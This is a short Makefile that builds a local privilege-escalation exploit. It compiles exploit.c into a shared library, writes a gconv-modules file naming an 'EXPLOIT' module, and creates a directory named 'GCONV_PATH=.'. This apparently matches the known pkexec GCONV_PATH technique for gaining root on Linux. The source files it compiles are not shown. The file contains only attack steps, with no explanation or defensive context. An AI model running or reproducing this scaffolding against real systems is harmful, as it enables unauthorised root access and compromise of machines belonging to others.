binaries: exploit.c main.c
	gcc main.c -o main.o
	gcc -fPIC --shared exploit.c -o exploit.so


exploit: binaries
	echo "module UTF-8// EXPLOIT// exploit 1" > gconv-modules
	mkdir -p GCONV_PATH=.
	cp /bin/true GCONV_PATH=./exploit.so:.
